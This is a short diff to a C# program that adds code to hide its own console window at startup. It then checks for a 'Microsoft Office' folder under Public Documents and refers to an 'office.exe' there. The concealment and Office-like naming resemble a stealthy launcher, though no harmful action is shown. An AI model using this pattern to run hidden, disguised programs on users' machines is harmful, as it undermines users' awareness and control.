@@ -3,12 +3,23 @@ using System.Diagnostics;
 using System.Runtime;
 using System.IO;
 using Microsoft.Win32;
+using System.Runtime.InteropServices;
+using System.Threading;
 namespace Startprogram
 {
 	class Pogram
 	{
+		[DllImport("Kernel32.dll")]
+		private static extern IntPtr GetConsoleWindow();
+		[DllImport("User32.dll")]
+		private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
 		static void Main(string[] args)
 		{
+			IntPtr hWnd = GetConsoleWindow();
+			if(hWnd != IntPtr.Zero)
+			{
+				ShowWindow(hWnd, 0);
+			}
 			if (Directory.Exists(@"C:\Users\Public\Documents\Microsoft Office") == true)
 			{
 				string path = @"office.exe";
